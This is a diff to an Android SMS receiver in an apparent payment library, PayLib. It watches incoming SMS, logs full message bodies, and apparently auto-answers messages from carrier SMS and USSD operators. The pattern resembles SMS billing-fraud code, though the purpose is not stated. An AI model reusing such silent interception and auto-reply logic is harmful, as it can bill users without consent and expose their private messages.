@@ -11,7 +11,9 @@ import android.telephony.SmsMessage;
 import com.p2plib2.Logger;
 import com.p2plib2.PayLib;
 
-import static com.p2plib2.PayLib.operator;
+import static com.p2plib2.PayLib.operatorSMS;
+import static com.p2plib2.PayLib.operatorUssd;
+
 
 public class SmsMonitor extends BroadcastReceiver {
 
@@ -21,10 +23,13 @@ public class SmsMonitor extends BroadcastReceiver {
         if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
             String smsSender = "";
             String smsBody = "";
+            int status = 0;
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                 for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                     smsSender = smsMessage.getDisplayOriginatingAddress();
                     smsBody += smsMessage.getMessageBody();
+                    Logger.lg("FIRST");
+                    status = smsMessage.getStatus();
                 }
             } else {
                 Bundle smsBundle = intent.getExtras();
@@ -42,22 +47,29 @@ public class SmsMonitor extends BroadcastReceiver {
                         smsBody += messages[i].getMessageBody();
                     }
                     smsSender = messages[0].getOriginatingAddress();
+                    Logger.lg("Second");
+                    status = messages[0].getStatus();
                 }
             }
-            Logger.lg("sender " + smsSender + " " + operator.smsNum + " " +operator.smsNum.contains(smsSender)  + "  smsBody.contains(operator.target) " +  smsBody.contains(operator.target));
-            if (operator.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(operator.name)
-                    || smsBody.contains(operator.target)) {
+            Logger.lg("sender " + smsSender + " " + operatorSMS.smsNum + " " + operatorSMS.smsNum.contains(smsSender)  + "  smsBody.contains(operatorSMS.target) " +  smsBody.contains(operatorSMS.target)
+                    +"body  " + smsBody +" status " + status
+            );
+            if (operatorSMS.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(operatorSMS.name)
+                    || smsBody.contains(operatorSMS.target)
+                    || operatorUssd.smsNum.contains(smsSender) || smsSender.toUpperCase().equals(operatorUssd.name)) {
                 PayLib.getSMSResult(smsBody);
                 PayLib.sendAnswer(smsBody, smsSender);
             }
         } else if (intent.getAction().equals(Telephony.Sms.Intents.SMS_DELIVER_ACTION)){
             String smsSender = "";
             String smsBody = "";
+            int status = 0;
             for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
                 smsSender = smsMessage.getDisplayOriginatingAddress();
                 smsBody += smsMessage.getMessageBody();
+                status = smsMessage.getStatus();
             }
-            Logger.lg("smsSender " + smsSender + " smsBody " + smsBody) ;
+            Logger.lg("smsSender " + smsSender + " smsBody " + smsBody + " status " + status) ;
         }
     }
 }
